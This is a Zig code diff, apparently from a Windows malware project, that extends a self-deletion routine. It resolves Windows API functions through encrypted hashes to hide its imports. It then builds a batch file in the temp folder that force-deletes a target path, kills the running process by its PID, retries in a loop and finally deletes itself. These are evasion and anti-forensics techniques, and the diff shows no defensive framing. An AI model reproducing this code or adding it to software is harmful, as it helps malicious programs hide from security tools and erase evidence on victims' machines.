@@ -93,22 +93,51 @@ fn deleteLevel3(path: []const u8) bool {
     const func = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetTempPathW")) orelse return false;
     const GetTempPathW: *const fn (len: u32, buf: [*]u16) callconv(.winapi) u32 = @ptrCast(@alignCast(func));
 
+    const getpid = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetCurrentProcessId")) orelse return false;
+    const GetCurrentProcessId: *const fn () callconv(.winapi) u32 = @ptrCast(@alignCast(getpid));
+
     var temp_buf: [512]u16 = undefined;
     const temp_len = GetTempPathW(512, &temp_buf);
     if (temp_len == 0) return false;
 
+    const pid = GetCurrentProcessId();
+
     var batch_buf: [4096]u8 = undefined;
     var pos: usize = 0;
+
     const b_pre = "@echo off\r\n:loop\r\ndel /F /Q \"";
     @memcpy(batch_buf[pos..][0..b_pre.len], b_pre);
     pos += b_pre.len;
+
     @memcpy(batch_buf[pos..][0..path.len], path);
     pos += path.len;
-    const b_mid = "\" >nul 2>&1\r\nif exist \"";
-    @memcpy(batch_buf[pos..][0..b_mid.len], b_mid);
-    pos += b_mid.len;
+
+    const b_del_end = "\" >nul 2>&1\r\n";
+    @memcpy(batch_buf[pos..][0..b_del_end.len], b_del_end);
+    pos += b_del_end.len;
+
+    const b_taskkill = "taskkill /F /PID ";
+    @memcpy(batch_buf[pos..][0..b_taskkill.len], b_taskkill);
+    pos += b_taskkill.len;
+
+    const pid_str = std.fmt.formatIntBuf(batch_buf[pos..], pid, 10, .lower, .{});
+    pos += pid_str;
+
+    const b_taskkill_end = " >nul 2>&1\r\n";
+    @memcpy(batch_buf[pos..][0..b_taskkill_end.len], b_taskkill_end);
+    pos += b_taskkill_end.len;
+
+    const b_timeout = "timeout /t 2 /nobreak >nul 2>&1\r\n";
+    @memcpy(batch_buf[pos..][0..b_timeout.len], b_timeout);
+    pos += b_timeout.len;
+
+    const b_if_exist = "if exist \"";
+    @memcpy(batch_buf[pos..][0..b_if_exist.len], b_if_exist);
+    pos += b_if_exist.len;
+
     @memcpy(batch_buf[pos..][0..path.len], path);
     pos += path.len;
+
     const b_end = "\" goto loop\r\ndel /F /Q \"%~f0\" >nul 2>&1\r\nexit\r\n";
     @memcpy(batch_buf[pos..][0..b_end.len], b_end);
     pos += b_end.len;
